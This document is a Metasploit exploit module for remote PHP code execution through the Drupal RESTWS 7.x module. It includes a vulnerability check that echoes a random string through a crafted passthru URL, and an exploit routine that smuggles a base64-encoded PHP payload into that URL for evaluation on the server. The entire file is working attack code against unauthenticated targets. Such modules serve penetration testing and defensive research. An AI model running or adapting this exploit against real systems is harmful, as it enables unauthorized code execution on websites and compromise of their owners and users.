# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Drupal RESTWS Module 7.x Remote PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the Drupal RESTWS module vulnerability.
        RESTWS alters the default page callbacks for entities to provide
        additional functionality. A vulnerability in this approach allows
        an unauthenticated attacker to send specially crafted requests resulting
        in arbitrary PHP execution
 
        This module was tested against RESTWS 7.x with Drupal 7.5
installation on Ubuntu server.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Devin Zuczek&#039;,                        # discovery
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039;  # msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://www.drupal.org/node/2765567&#039;],
          [&#039;URL&#039;,
&#039;https://www.mehmetince.net/exploit/drupal-restws-module-7x-remote-php-code-execution&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039; => &#039;Jul 13 2016&#039;,
      &#039;DefaultTarget&#039;  => 0
      ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "The target URI of the
Drupal installation", &#039;/&#039;])
      ], self.class
    )
  end
 
  def check
    r = rand_text_alpha(8 + rand(4))
    url = normalize_uri(target_uri.path, "?q=taxonomy_vocabulary/", r
, "/passthru/echo%20#{r}")
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => url
    )
    if res && res.body =~ /#{r}/
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    random = rand_text_alpha(1 + rand(2))
    url = normalize_uri(target_uri.path,
      "?q=taxonomy_vocabulary/",
      random ,
      "/passthru/",
      Rex::Text.uri_encode("php -r
&#039;eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\"));&#039;")
    )
    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => url
    )
  end
end

